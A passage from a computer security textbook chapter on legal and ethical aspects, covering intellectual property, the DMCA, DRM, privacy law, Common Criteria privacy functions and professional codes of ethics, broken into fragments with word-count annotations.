the patent holder, RSA Security, was entitled to receive a fee for each implementation 
of RSA.
[Word Count: 45]

Intellectual Property Relevant to Network  
and Computer Security
[Word Count: 8]

A number of forms of intellectual property are relevant in the context of network 
and computer security. Here we mention some of the most prominent:
[Word Count: 25]

• Software: This includes programs produced by vendors of commercial software
[Word Count: 11]

(e.g., operating systems, utility programs, applications) as well as shareware, 
proprietary software created by an organization for internal use, and software 
­produced by individuals. For all such software, copyright protection is available if 
desired. In some cases, a patent protection may also be appropriate.
 
• Databases: A database may consist of data that is collected and organized in
[Word Count: 58]

such a fashion that it has potential commercial value. An example is an eco-
nomic forecasting database. Such databases may be protected by copyright.
 
• Digital content: This category includes audio files, video files, multimedia,
[Word Count: 35]

courseware, Web site content, and any other original digital work that can be 
presented in some fashion using computers or other digital devices.
[Word Count: 23]

618    Chapter 19 / Legal and Ethical Aspects
[Word Count: 8]

• Algorithms: An example of a patentable algorithm, previously cited, is the
[Word Count: 12]

The U.S. Digital Millennium Copyright Act (DMCA) has had a profound effect 
on the protection of digital content rights in both the United States and worldwide. 
The DMCA, signed into law in 1998, is designed to implement World Intellectual 
Property Organization (WIPO) treaties, signed in 1996. In essence, DMCA 
strengthens the protection of copyrighted materials in digital format.
[Word Count: 58]

Certain actions are exempted from the provisions of the DMCA and other 
copyright laws, including the following:
[Word Count: 17]

• Fair use: This concept is not tightly defined. It is intended to permit others to
[Word Count: 16]

perform, show, quote, copy, and otherwise distribute portions of the work for 
certain purposes. These purposes include review, comment, and discussion of 
copyrighted works.
 
• Reverse engineering: Reverse engineering of a software product is allowed if
[Word Count: 36]

the user has the right to use a copy of the program and if the purpose of the 
reverse engineering is not to duplicate the functionality of the program but 
rather to achieve interoperability.
 
• Encryption research: “Good faith” encryption research is allowed. In essence,
[Word Count: 45]

this exemption allows decryption attempts to advance the development of 
encryption technology.
 
• Security testing: This is the access of a computer or network for the good faith
[Word Count: 28]

testing, investigating, or correcting a security flaw or vulnerability, with the 
authorization of the owner or operator.
[Word Count: 17]

• Personal privacy: It is generally permitted to bypass technological measures if
[Word Count: 12]

that is the only reasonable way to prevent the access to result in the revealing 
or recording of personally identifying information.
[Word Count: 21]

Despite the exemptions built into the Act, there is considerable concern, 
especially in the research and academic communities, that the act inhibits legiti-
mate security and encryption research. These parties feel that DMCA stifles inno-
vation and academic freedom and is a threat to open source software development 
[ACM04].
[Word Count: 49]

Digital Rights Management (DRM) refers to systems and procedures that ensure 
that holders of digital rights are clearly identified and receive the stipulated pay-
ment for their works. The systems and procedures may also impose further restric-
tions on the use of digital objects, such as inhibiting printing or prohibiting further 
distribution.
[Word Count: 52]

There is no single DRM standard or architecture. DRM encompasses a variety 
of approaches to intellectual property management and enforcement by providing 
secure and trusted automated services to control the distribution and use of content. 
In general, the objective is to provide mechanisms for the complete content manage-
ment life cycle (creation, subsequent contribution by others, access, distribution, use), 
including the management of rights information associated with the content.
[Word Count: 69]

DRM systems should meet the following objectives:
[Word Count: 7]

1.	 Provide persistent content protection against unauthorized access to the
[Word Count: 10]

­digital content, limiting access to only those with the proper authorization.
	
2.	 Support a variety of digital content types (e.g., music files, video streams, digital
[Word Count: 25]

books, images).
	
3.	 Support content use on a variety of platforms, (e.g., PCs, PDAs, iPods, mobile
[Word Count: 16]

phones).
	
4.	 Support content distribution on a variety of media, including CD-ROMs,
[Word Count: 12]

Figure 19.2, based on [LIU03], illustrates a typical DRM model in terms of the 
principal users of DRM systems:
[Word Count: 19]

• Content provider: Holds the digital rights of the content and wants to protect
[Word Count: 14]

these rights. Examples are a music record label and a movie studio.
[Word Count: 12]

• Distributor: Provides distribution channels, such as an online shop or a Web
[Word Count: 13]

retailer. For example, an online distributor receives the digital content from 
the content provider and creates a Web catalog presenting the content and 
rights metadata for the content promotion.
 
• Consumer: Uses the system to access the digital content by retrieving down-
[Word Count: 42]

loadable or streaming content through the distribution channel and then 
paying for the digital license. The player/viewer application used by the 
consumer takes charge of initiating license request to the clearinghouse and 
enforcing the content usage rights.
[Word Count: 37]

620    Chapter 19 / Legal and Ethical Aspects
[Word Count: 8]

• Clearinghouse: Handles the financial transaction for issuing the digital license
[Word Count: 11]

to the consumer and pays royalty fees to the content provider and distribution 
fees to the distributor accordingly. The clearinghouse is also responsible for 
logging license consumptions for every consumer.
[Word Count: 30]

In this model, the distributor need not enforce the access rights. Instead, the 
content provider protects the content in such a way (typically encryption) that the 
consumer must purchase a digital license and access capability from the clearing-
house. The clearinghouse consults usage rules provided by the content provider to 
determine what access is permitted and the fee for a particular type of access. Having 
collected the fee, the clearinghouse credits the content provider and ­distributor 
appropriately.
[Word Count: 77]

Figure 19.3 shows a generic system architecture to support DRM functional-
ity. The system is accessed by parties in three roles. Rights holders are the content 
providers, who either created the content or have acquired rights to the content. 
Service providers include distributors and clearinghouses. Consumers are those who 
purchase the right to access to content for specific uses. There is ­system interface to 
the services provided by the DRM system:
[Word Count: 71]

• Identity management: Mechanisms to uniquely identify entities, such as par-
[Word Count: 11]

• Content management: Processes and functions needed to manage the content
[Word Count: 11]

lifestyle.
 
• Rights management: Processes and functions needed to manage rights, rights
[Word Count: 12]

Below these management modules are a set of common functions. The security/
encryption module provides functions to encrypt content and to sign license agree-
ments. The identity management service makes use of the authentication and author-
ization functions to identify all parties in the relationship. Using these ­functions, the 
identity management service includes the following:
[Word Count: 55]

• Allocation of unique party identifiers
 
• User profile and preferences
 
• User’s device management
 
• Public-key management
[Word Count: 18]

Billing/payments functions deal with the collection of usage fees from con-
sumers and the distribution of payments to rights holders and distributors. Delivery 
functions deal with the delivery of content to consumers.
[Word Count: 32]

An issue with considerable overlap with computer security is that of privacy. On one 
hand, the scale and interconnectedness of personal information collected and stored 
in information systems has increased dramatically, motivated by law enforcement, 
national security, and economic incentives. The last mentioned has been ­perhaps 
the main driving force. In a global information economy, it is likely that the most 
economically valuable electronic asset is aggregations of information on ­individuals
[Word Count: 71]

622    Chapter 19 / Legal and Ethical Aspects
[Word Count: 8]

[JUDY14]. On the other hand, individuals have become increasingly aware of the 
extent to which government agencies, businesses, and even Internet users have access 
to their personal information and private details about their lives and activities.
[Word Count: 36]

Concerns about the extent to which personal privacy has been and may be 
compromised have led to a variety of legal and technical approaches to reinforcing 
privacy rights.
[Word Count: 28]

A number of international organizations and national governments have intro-
duced laws and regulations intended to protect individual privacy. We look at two 
such initiatives in this subsection.
[Word Count: 28]

European Union Data Protection Directive  In 1998, the EU adopted the 
Directive on Data Protection to both (1) ensure that member states protected 
fundamental privacy rights when processing personal information, and (2) prevent 
member states from restricting the free flow of personal information within the 
EU. The Directive is not itself a law, but requires member states to enact laws 
encompassing its terms. The Directive is organized around the following principles 
of personal information use:
[Word Count: 75]

• Notice: Organizations must notify individuals what personal information they are
[Word Count: 11]

collecting, the uses of that information, and what choices the individual may have.
 
• Consent: Individuals must be able to choose whether and how their personal
[Word Count: 26]

information is used by, or disclosed to, third parties. They have the right not to 
have any sensitive information collected or used without express permission, 
including race, religion, health, union membership, beliefs, and sex life.
 
• Consistency: Organizations may use personal information only in accordance
[Word Count: 45]

with the terms of the notice given the data subject and any choices with respect 
to its use exercised by the subject.
 
• Access: Individuals must have the right and ability to access their information
[Word Count: 35]

and correct, modify, or delete any portion of it.
 
• Security: Organizations must provide adequate security, using technical and
[Word Count: 19]

other means, to protect the integrity and confidentiality of personal information.
 
• Onward transfer: Third parties receiving personal information must provide
[Word Count: 21]

the same level of privacy protection as the organization from whom the infor-
mation is obtained.
[Word Count: 16]

• Enforcement: The Directive grants a private right of action to data subjects
[Word Count: 13]

when organizations do not follow the law. In addition, each EU member has a 
regulatory enforcement agency concerned with privacy rights enforcement.
[Word Count: 22]

United States Privacy Initiatives  The first comprehensive privacy legislation 
adopted in the United States was the Privacy Act of 1974, which dealt with personal 
information collected and used by federal agencies. The Act is intended to:
[Word Count: 36]

1.	 Permit individuals to determine what records pertaining to them are collected,
[Word Count: 12]

2.	 Permit individuals to forbid records obtained for one purpose to be used for
[Word Count: 14]

another purpose without consent.
	
3.	 Permit individuals to obtain access to records pertaining to them and to ­correct
[Word Count: 18]

and amend such records as appropriate.
	
4.	 Ensure that agencies collect, maintain, and use personal information in a man-
[Word Count: 19]

ner that ensures that the information is current, adequate, relevant, and not 
excessive for its intended use.
	
5.	 Create a private right of action for individuals whose personal information is
[Word Count: 30]

As with all privacy laws and regulations, there are exceptions and conditions 
attached to this Act, such as criminal investigations, national security concerns, and 
conflicts between competing individual rights of privacy.
[Word Count: 31]

While the 1974 Privacy Act covers government records, a number of other 
U.S. laws have been enacted that cover other areas, including the following:
[Word Count: 24]

• Banking and financial records: Personal banking information is protected
[Word Count: 10]

in certain ways by a number of laws, including the recent Financial Services 
Modernization Act.
 
• Credit reports: The Fair Credit Reporting Act confers certain rights on indi-
[Word Count: 28]

viduals and obligations on credit reporting agencies.
 
• Medical and health insurance records: A variety of laws have been in place
[Word Count: 21]

for decades dealing with medical records privacy. The Health Insurance 
Portability and Accountability Act (HIPPA) created significant new rights for 
patients to protect and access their own health information.
 
• Children’s privacy: The Children’s Online Privacy Protection Act places
[Word Count: 39]

restrictions on online organizations in the collection of data from children 
under the age of 13.
 
• Electronic communications: The Electronic Communications Privacy Act
[Word Count: 24]

generally prohibits unauthorized and intentional interception of wire an 
electronic communications during the transmission phase and unauthorized 
accessing of electronically stored wire and electronic communications.
[Word Count: 25]

Organizations need to deploy both management controls and technical measures 
to comply with laws and regulations concerning privacy as well as to implement 
corporate policies concerning employee privacy. ISO 27002 (Code of Practice for 
Information Security Management) states the requirement as follows:
[Word Count: 42]

Privacy and protection of personally identifiable information An organization’s 
data policy for privacy and protection of personally identifiable information 
should be developed and implemented. This policy should be communicated  
to all persons involved in the processing of personally identifiable information.  
Compliance with this policy and all relevant legislation and regulations concerning
[Word Count: 51]

624    Chapter 19 / Legal and Ethical Aspects
[Word Count: 8]

An excellent, detailed list of considerations for organizational implementation 
of privacy controls is provided in The Standard of Good Practice for Information 
Security, from the Information Security Forum [ISF12]. This material is reproduced 
in Appendix H.4.
[Word Count: 36]

The Common Criteria specification [CCPS12b] includes a definition of a set of func-
tional requirements in a Privacy Class, which should be implemented in a trusted system. 
The purpose of the privacy functions is to provide a user protection against discovery 
and misuse of identity by other users. This specification is a useful guide to how to design 
privacy support functions as part of a computer system. Figure 19.4 shows a breakdown 
of privacy into four major areas, each of which has one or more specific functions:
[Word Count: 87]

• Anonymity: Ensures that a user may use a resource or service without
[Word Count: 13]

­disclosing the user’s identity. Specifically, this means that other users or 
­subjects are unable to determine the identity of a user bound to a subject 
(e.g., process or user group) or operation. It further means that the system 
will not solicit the real name of a user. Anonymity need not conflict with 
­authorization and access control functions, which are bound to computer-
based user IDs, not to personal user information.
 
• Pseudonymity: Ensures that a user may use a resource or service without
[Word Count: 83]

disclosing its user identity, but can still be accountable for that use. The sys-
tem shall provide an alias to prevent other users from determining a user’s 
identity, but the system shall be able to determine the user’s identity from an 
assigned alias.
 
• Unlinkability: Ensures that a user may make multiple uses of resources or
[Word Count: 56]

services without others being able to link these uses together.
 
• Unobservability: Ensures that a user may use a resource or service without
[Word Count: 23]

others, especially third parties, being able to observe that the resource or serv-
ice is being used. Unobservability requires that users and/or subjects ­cannot 
determine whether an operation is being performed. Allocation of informa-
tion impacting unobservability requires that the security function provide 
­specific mechanisms to avoid the concentration of privacy related information 
within the system. Unobservability without soliciting information requires that 
the security function does not try to obtain privacy-related information that
[Word Count: 73]

the protection of the privacy of people and the protection of personally identifi-
able information requires appropriate management structure and control. Often 
this is best achieved by the appointment of a person responsible, such as a privacy 
officer, who should provide guidance to managers, users and service providers  
on their individual responsibilities and the specific procedures that should be  
followed. Responsibility for handling personally identifiable information and 
ensuring awareness of the privacy principles should be dealt with in accordance 
with relevant legislation and regulations. Appropriate technical and organizational 
measures to protect personally identifiable information should be implemented.
[Word Count: 97]

Unobservability
Unobservability without soliciting information
[Word Count: 5]

Allocation of information impacting unobservability
[Word Count: 5]

Anonymity
Anonymity without soliciting information
[Word Count: 5]

Figure 19.4  Common Criteria Privacy Class Decomposition
[Word Count: 7]

might be used to compromise unobservability. Authorized user observability 
requires the security function to provide one or more authorized users with a 
capability to observe the usage of resources and/or services.
[Word Count: 31]

Note that the Common Criteria specification is primarily concerned with the privacy 
of an individual with respect to that individual’s use of computer resources, rather 
than the privacy of personal information concerning that individual.
[Word Count: 34]

The demands of homeland security and counterterrorism have imposed new threats 
to personal privacy. Law enforcement and intelligence agencies have become 
increasingly aggressive in using data surveillance techniques to fulfill their mission. 
In addition, private organizations are exploiting a number of trends to increase their 
ability to build detailed profiles of individuals, including the spread of the Internet, 
the increase in electronic payment methods, near-universal use of cellular phone 
communications, ubiquitous computation, sensor webs, and so on.
[Word Count: 77]

Both policy and technical approaches are needed to protect privacy when both 
government and nongovernment organizations seek to learn as much as possible 
about individuals. In terms of technical approaches, the requirements for privacy 
protection for information systems can be addressed in the context of database 
­security. That is, the approaches that are appropriate for privacy protection involve
[Word Count: 58]

626    Chapter 19 / Legal and Ethical Aspects
[Word Count: 8]

technical means that have been developed for database security. These are discussed 
in detail in Chapter 5.
[Word Count: 17]

A specific proposal for a database security approach to privacy protection is 
outlined in [POPP06]. The privacy appliance is a tamper-resistant, cryptographically 
protected device that is interposed between a database and the access interface, analo-
gous to a firewall or intrusion prevention device. The device implements privacy pro-
tection functions, including verifying the user’s access permissions and credentials and 
creating an audit log. Some of the ­specific functions of the appliance are as follows:
[Word Count: 74]

• Data transformation: This function encodes or encrypts portions of the data
[Word Count: 12]

so as to preserver privacy but still allow data analysis functions needed for 
effective use. An example of such data analysis functions is the detection of 
terrorist activity patterns.
 
• Anonymization: This function removes specific identifying information from
[Word Count: 38]

query results, such as last name and telephone number, but creates some 
sort of anonymized unique identifier so that analysts can detect connections 
between queries.
 
• Selective revelation: This is a method for minimizing exposure of individual
[Word Count: 37]

information while enabling continuous analysis of potentially interconnected 
data. The function initially reveals information to the analyst only in sanitized 
form, that is, in terms of statistics and categories that do not reveal (directly or 
indirectly) anyone’s private information. If the analyst sees reason for ­concern, 
he or she can follow up by seeking permission to get more precise information. 
This permission would be granted if the initial information provides sufficient 
cause to allow the revelation of more information, under appropriate legal 
and policy guidelines.
 
• Immutable audit: A tamper-resistant method that identifies where data go
[Word Count: 96]

and who has seen the data. The audit function automatically and permanently 
records all data accesses, with strong protection against deletion, modification, 
and unauthorized use.
 
• Associative memory: This is a software module that can recognize patterns
[Word Count: 37]

and make connections between pieces of data that the human user may have 
missed or did not know existed. With this method, it can discover relationships 
quickly between data points found in massive amounts of data.
[Word Count: 36]

The owner of a database installs a privacy appliance tailored to the database 
content and structure and to its intended use by outside organizations. An inde-
pendently operated privacy appliance can interact with multiple databases from 
multiple organizations to collect and interconnect data for their ultimate use by 
law enforcement, an intelligence user, or other appropriate user.
[Word Count: 57]

Because of the ubiquity and importance of information systems in organization of 
all types, there are many potential misuses and abuses of information and electronic 
communication that create privacy and security problems. In addition to questions
[Word Count: 36]

of legality, misuse and abuse raise concerns of ethics. Ethics refers to a system of 
moral principles that relates to the benefits and harms of particular actions, and to 
the rightness and wrongness of motives and ends of those actions. In this section, 
we look at ethical issues as they relate to computer and information system security.
[Word Count: 57]

Further, it has always been the case that those with special knowledge or 
­special skills have additional ethical obligations beyond those common to all human-
ity. We can illustrate this in terms of an ethical hierarchy (Figure 19.5), based on one
[Word Count: 41]

standards and
professionalism, standards
[Word Count: 4]

628    Chapter 19 / Legal and Ethical Aspects
[Word Count: 8]

Ethical Issues Related to Computers and Information 
Systems
[Word Count: 8]

Let us turn now more specifically to the ethical issues that arise from computer 
­technology. Computers have become the primary repository of both personal infor-
mation and negotiable assets, such as bank records, securities records, and other 
financial information. Other types of databases, both statistical and otherwise, are 
assets with considerable value. These assets can only be viewed, created, and altered 
by technical and automated means. Those who can understand and exploit the 
­technology, plus those who have obtained access permission, have power related to 
those assets.
[Word Count: 87]

A classic paper on computers and ethics [PARK88] points out that ethical 
issues arise as the result of the roles of computers, such as the following:
[Word Count: 26]

• Repositories and processors of information: Unauthorized use of otherwise
[Word Count: 10]

unused computer services or of information stored in computers raises ques-
tions of appropriateness or fairness.
 
• Producers of new forms and types of assets: For example, computer programs
[Word Count: 29]

are entirely new types of assets, possibly not subject to the same concepts of 
ownership as other assets.
 
• Instruments of acts: To what degree must computer services and users of com-
[Word Count: 32]

puters, data, and programs be responsible for the integrity and appropriate-
ness of computer output?
 
• Symbols of intimidation and deception: The images of computers as thinking
[Word Count: 27]

machines, absolute truth producers, infallible, subject to blame, and as anthro-
pomorphic replacements of humans who err should be carefully considered.
[Word Count: 21]

Additionally, professional societies should provide a mechanism whereby society 
members can get advice on how to proceed.
[Word Count: 17]

Another example of an ethical question concerns a potential conflict of inter-
est. For example, if a consultant has a financial interest in a certain vendor, this 
should be revealed to any client if that vendor’s products or services might be rec-
ommended by the consultant.
[Word Count: 46]

Unlike scientific and engineering fields, ethics cannot be reduced to precise laws 
or sets of facts. Although an employer or a client of a professional can expect that 
the professional has an internal moral compass, many areas of conduct may pres-
ent ethical ambiguities. To provide guidance to professionals and to articulate what 
employers and customers have a right to expect, a number of professional societies 
have adopted ethical codes of conduct.
[Word Count: 72]

A professional code of conduct can serve the following functions [GOTT99]:
[Word Count: 11]

1.	 A code can serve two inspirational functions: as a positive stimulus for ethical
[Word Count: 14]

conduct on the part of the professional, and to instill confidence in the cus-
tomer or user of an IS product or service. However, a code that stops at just 
providing inspirational language is likely to be vague and open to an abun-
dance of interpretations.
	
2.	 A code can be educational. It informs professionals about what should be their
[Word Count: 60]

commitment to undertake a certain level of quality of work and their respon-
sibility for the well-being of users of their product and the public, to the extent 
the product may affect nonusers. The code also serves to educate managers on 
their responsibility to encourage and support employee ethical behavior and 
on their own ethical responsibilities.
	
3.	 A code provides a measure of support for a professional whose decision to act
[Word Count: 71]

ethically in a situation may create conflict with an employer or customer.
	
4.	 A code can be a means of deterrence and discipline. A professional society
[Word Count: 26]

can use a code as a justification for revoking membership or even a profes-
sional license. An employee can use a code as a basis for a disciplinary action.
	
5.	 A code can enhance the profession’s public image, if it is seen to be widely
[Word Count: 45]

We illustrate the concept of a professional code of ethics for computer pro-
fessionals with three specific examples. The ACM (Association for Computing 
Machinery) Code of Ethics and Professional Conduct (Figure 19.6) applies to 
­computer scientists.5 The IEEE (Institute of Electrical and Electronic Engineers) 
Code of Ethics (Figure 19.7) applies to computer engineers as well as other types 
of electrical and electronic engineers. The AITP (Association of Information 
Technology Professionals, formerly the Data Processing Management Association) 
Standard of Conduct (Figure 19.8) applies to managers of computer systems and 
projects.
[Word Count: 89]

5Figure 19.6 is an abridged version of the ACM Code.
[Word Count: 10]

630    Chapter 19 / Legal and Ethical Aspects
[Word Count: 8]

A number of common themes emerge from these codes, including (1) dignity 
and worth of other people; (2) personal integrity and honesty; (3) responsibility for 
work; (4) confidentiality of information; (5) public safety, health, and welfare; (6) par-
ticipation in professional societies to improve standards of the profession; and (7) the 
notion that public knowledge and access to technology is equivalent to social power.
[Word Count: 64]

All three codes place their emphasis on the responsibility of professionals to 
other people, which, after all, is the central meaning of ethics. This emphasis on 
people rather than machines or software is to the good. However, the codes make 
little specific mention of the subject technology, namely computers and information
[Word Count: 51]

Figure 19.6  ACM Code of Ethics and Professional Conduct
(Copyright © 1997, Association for Computing Machinery, Inc.)
[Word Count: 17]

1. GENERAL MORAL IMPERATIVES.
1.1  Contribute to society and human well-being.
1.2  Avoid harm to others.
1.3  Be honest and trustworthy.
1.4  Be fair and take action not to discriminate.
1.5  Honor property rights including copyrights and patent.
1.6  Give proper credit for intellectual property.
1.7  Respect the privacy of others.
1.8  Honor confidentiality.
[Word Count: 54]

2. MORE SPECIFIC PROFESSIONAL RESPONSIBILITIES.
2.1  Strive to achieve the highest quality, effectiveness and dignity in both the process and prod-
[Word Count: 21]

ucts of professional work.
2.2  Acquire and maintain professional competence.
2.3  Know and respect existing laws pertaining to professional work.
2.4  Accept and provide appropriate professional review.
2.5  Give comprehensive and thorough evaluations of computer systems and their impacts, includ-
[Word Count: 40]

ing analysis of possible risks.
2.6  Honor contracts, agreements, and assigned responsibilities.
2.7  Improve public understanding of computing and its consequences.
2.8  Access computing and communication resources only when authorized to do so.
[Word Count: 33]

3. ORGANIZATIONAL LEADERSHIP IMPERATIVES.
3.1  Articulate social responsibilities of members of an organizational unit and encourage full
[Word Count: 17]

acceptance of those responsibilities.
3.2  Manage personnel and resources to design and build information systems that enhance the
[Word Count: 18]

quality of working life.
3.3  Acknowledge and support proper and authorized uses of an organization’s computing and
[Word Count: 17]

­communication resources.
3.4  Ensure that users and those who will be affected by a system have their needs clearly
[Word Count: 19]

­articulated during the assessment and design of requirements; later the system must be 
­validated to meet requirements.
3.5  Articulate and support policies that protect the dignity of users and others affected by a
[Word Count: 33]

­computing system.
3.6  Create opportunities for members of the organization to learn the principles and limitations of
[Word Count: 17]

4. COMPLIANCE WITH THE CODE.
4.1  Uphold and promote the principles of this Code.
4.2  Treat violations of this code as inconsistent with membership in the ACM.
[Word Count: 27]

Figure 19.7  IEEE Code of Ethics
(Copyright © 2006, Institute of Electrical and Electronics Engineers)
[Word Count: 15]

We, the members of the IEEE, in recognition of the importance of our technologies in affecting 
the quality of life throughout the world, and in accepting a personal obligation to our profession, 
its members and the communities we serve, do hereby commit ourselves to the highest ethical and 
professional conduct and agree:
[Word Count: 52]

1.		 to accept responsibility in making decisions consistent with the safety, health and welfare of
[Word Count: 16]

the public, and to disclose promptly factors that might endanger the public or the environment;
	 2.	 to avoid real or perceived conflicts of interest whenever possible, and to disclose them to
[Word Count: 31]

affected parties when they do exist;
	 3.	 to be honest and realistic in stating claims or estimates based on available data;
	 4.	 to reject bribery in all its forms;
	 5.	 to improve the understanding of technology, its appropriate application, and potential
[Word Count: 41]

­consequences;
	 6.	 to maintain and improve our technical competence and to undertake technological tasks
[Word Count: 14]

for others only if qualified by training or experience, or after full disclosure of pertinent 
­limitations;
	 7.	 to seek, accept, and offer honest criticism of technical work, to acknowledge and correct
[Word Count: 31]

errors, and to credit properly the contributions of others;
	 8.	 to treat fairly all persons regardless of such factors as race, religion, gender, disability, age, or
[Word Count: 26]

national origin;
	 9.	 to avoid injuring others, their property, reputation, or employment by false or malicious
[Word Count: 16]

action;
 10.   to assist colleagues and co-workers in their professional development and to support them in
[Word Count: 16]

Figure 19.8  AITP Standard of Conduct
(Copyright © 2006, Association of Information Technology Professionals)
[Word Count: 14]

In recognition of my obligation to management I shall:
• Keep my personal knowledge up-to-date and insure that proper expertise is available when needed.
• Share my knowledge with others and present factual and objective information to management
[Word Count: 38]

to the best of my ability.
• Accept full responsibility for work that I perform.
• Not misuse the authority entrusted to me.
• Not misrepresent or withhold information concerning the capabilities of equipment, software
[Word Count: 35]

or systems.
• Not take advantage of the lack of knowledge or inexperience on the part of others.
[Word Count: 18]

In recognition of my obligation to my fellow members and the profession I shall:
• Be honest in all my professional relationships.
• Take appropriate action in regard to any illegal or unethical practices that come to my attention.
[Word Count: 39]

However, I will bring charges against any person only when I have reasonable basis for believing 
in the truth of the allegations and without any regard to personal interest.
• Endeavor to share my special knowledge.
• Cooperate with others in achieving understanding and in identifying problems.
• Not use or take credit for the work of others without specific acknowledgement and authorization.
• Not take advantage of the lack of knowledge or inexperience on the part of others for personal gain.
[Word Count: 82]

632    Chapter 19 / Legal and Ethical Aspects
[Word Count: 8]

systems. That is, the approach is quite generic and could apply to most professions 
and does not fully reflect the unique ethical problems related to the development 
and use of computer and IS technology. For example, these codes do not specifically 
deal with the issues raised by [PARK88] listed in the preceding subsection.
[Word Count: 53]

A different approach from the ones so far discussed is a collaborative effort to develop 
a short list of guidelines on the ethics of developing computer systems. The guidelines, 
which continue to evolve, are the product of the Ad Hoc Committee on Responsible 
Computing. Anyone can join this committee and suggest changes to the guidelines. The 
committee has published a document, regularly updated, entitled Moral Responsibility 
for Computing Artifacts, and is generally referred to as The Rules. The current version of 
The Rules is version 27, reflecting the thought and effort that has gone into this project.
[Word Count: 97]

The term computing artifact refers to any artifact that includes an ­executing 
computer program. This includes software applications running on a general ­purpose 
computer, programs burned into hardware and embedded in mechanical devices, 
robots, phones, web bots, toys, programs distributed across more than one machine, 
and many other configurations. The Rules apply to, among other types: software that 
is commercial, free, open source, recreational, an academic exercise or a research tool.
[Word Count: 71]

As of this writing, the Rules are as follows:
[Word Count: 9]

1.	 The people who design, develop, or deploy a computing artifact are morally
[Word Count: 13]

responsible for that artifact, and for the foreseeable effects of that artifact. 
This responsibility is shared with other people who design, develop, deploy or 
knowingly use the artifact as part of a sociotechnical system.
	
2.	 The shared responsibility of computing artifacts is not a zero-sum game. The
[Word Count: 47]

responsibility of an individual is not reduced simply because more people 
become involved in designing, developing, deploying, or using the artifact. 
Instead, a person’s responsibility includes being answerable for the behaviors 
of the artifact and for the artifact’s effects after deployment, to the degree to 
which these effects are reasonably foreseeable by that person.
	
3.	 People who knowingly use a particular computing artifact are morally respon-
[Word Count: 66]

sible for that use.
	
4.	 People who knowingly design, develop, deploy, or use a computing artifact
[Word Count: 16]

can do so responsibly only when they make a reasonable effort to take into 
account the sociotechnical systems in which the artifact is embedded.
	
5.	 People who design, develop, deploy, promote, or evaluate a computing ­artifact
[Word Count: 36]

should not explicitly or implicitly deceive users about the artifact or its foresee-
able effects, or about the sociotechnical systems in which the artifact is embedded.
[Word Count: 26]

Compared to the codes of ethics discussed earlier, The Rules are few in number 
and quite general in nature. They are intended to apply to a broad spectrum of people 
involved in computer system design and development. The Rules have gathered 
broad support as useful guidelines by academics, practitioners, ­computer scientists, 
and philosophers from a number of countries [MILL11]. It seems likely that The 
Rules will influence future versions of codes of ethics by computer-related profes-
sional organizations.
[Word Count: 78]

The following are useful articles on computer crime and cybercrime: [KSHE06], 
[CYMR06], and [TAVA00]. [BRAU01] provides a good introduction to copyrights, 
patents, and trademarks. [GIBB00] provides a concise description of the Digital 
Millennium Copyright Act. A useful introduction to Digital Rights Management is 
[LIU03]. [CAMP03] discusses legal aspects of DRM and describes some commer-
cially available systems.
[Word Count: 57]

ANDE93	 Anderson, R., et al. “Using the New ACM Code of Ethics in Decision
[Word Count: 14]

Making.” Communications of the ACM, February 1993.
BRAU01	 Braunfeld, R., and Wells, T. “Protecting Your Most Valuable Asset:
[Word Count: 18]

Intellectual Property.” IT Pro, March/April 2001.
CAMP03	 Camp, L. “First Principles of Copyright for DRM Design.” IEEE Internet
[Word Count: 18]

Computing, May/June 2003.
CHAP06	
Chapman, C. “Fundamental Ethics in Information Systems.” Proceedings of 
the 39th Hawaii International Conference on System Sciences, 2006.
CYMR06	 Team Cymru, “Cybercrime: An Epidemic.” ACM Queue, November 2006.
GIBB00 	
Gibbs, J. “The Digital Millennium Copyright Act.” ACM Ubiquity, August 
2000.
GOTT99 	 Gotterbarn, D. “How the New Software Engineering Code of Ethics Affects
[Word Count: 56]

You.” IEEE Software, November/ December 1999.
HARR90  Harrington, S., and McCollum, R. “Lessons from Corporate America
[Word Count: 16]

Applied to Training in Computer Ethics.” Proceedings of the ACM 
Conference on Computers and the Quality of Life (SIGCAS and SIGCAPH), 
September 1990.
ISAT02	
Information Science and Technology Study Group. “Security with Privacy,” 
DARPA Briefing on Security and Privacy, Dec. 2002. www.cs.berkeley
.edu/~tygar/ papers ISAT-final-briefing. pdf
KSHE06 	 Kshetri, N. “The Simple Economics of Cybercrimes.” IEEE Security and
[Word Count: 57]

Privacy, January/February 2006.
LIU03 	
Liu, Q.; Safavi-Naini, R.; and Sheppard, N. “Digital Rights Management 
for Content Distribution.” Proceedings, Australasian Information Security 
Workshop 2003 (AISW2003), 2003.
TAVA00 	 Tavani, H. “ Defining the Boundaries of Computer Crime: Piracy, Break-
[Word Count: 37]

Ins, and Sabotage in Cyberspace.” Computers and Society, September 2000.
[Word Count: 10]

634    Chapter 19 / Legal and Ethical Aspects
[Word Count: 8]

19.6	Key Terms, Review Questions, and Problems
[Word Count: 7]

code of conduct
computer crime
consumer
copyright
cybercrime
Digital Millennium
[Word Count: 10]

management
ethics
infringement
intellectual property
patent
privacy
[Word Count: 7]

rights holder
service provider
trademark
[Word Count: 5]

19.6 / Key Terms, Review Questions, and Problems   635
[Word Count: 9]

19.6	
Table 19.3 lists the privacy guidelines issued by the Organization for Economic Coop-
eration and Development (OECD). Compare these guidelines to the categories in the 
EU adopted the Directive on Data Protection.
	 19.7	
Many countries now require organizations that collect personal information to pub-
lish a privacy policy detailing how they will handle and use such information. Obtain 
a copy of the privacy policy for an organization to which you have provided your 
personal details. Compare this policy with the lists of principles given in Section 19.3. 
Does this policy address all of these principles?
[Word Count: 96]

Table 19.3  OECD Guidelines on the Protection of Privacy and Transborder Flows of Information
[Word Count: 14]

There should be limits to the collection of personal data and any such data should be obtained by lawful and 
fair means and, where appropriate, with the knowledge or consent of the data subject.
[Word Count: 34]

Personal data should be relevant to the purposes for which they are to be used, and, to the extent necessary 
for those purposes, should be accurate, complete and kept up-to-date.
[Word Count: 30]

The purposes for which personal data are collected should be specified not later than at the time of data 
­collection and the subsequent use limited to the fulfillment of those purposes or such others as are not incom-
patible with those purposes and as are specified on each occasion of change of purpose.
[Word Count: 53]

Personal data should not be disclosed, made available or otherwise used for purposes other than those 
­specified in accordance with the preceding principle, except with the consent of the data subject or by the 
authority of law.
[Word Count: 37]

Personal data should be protected by reasonable security safeguards against such risks as loss or unauthorized 
access, destruction, use, modification or disclosure of data.
[Word Count: 24]

There should be a general policy of openness about developments, practices and policies with respect to 
­personal data. Means should be readily available of establishing the existence and nature of personal data, and 
the main purposes of their use, as well as the identity and usual residence of the data controller.
[Word Count: 51]

a.	to obtain from a data controller, or otherwise, confirmation of whether or not the data controller has
[Word Count: 18]

data relating to him;
	
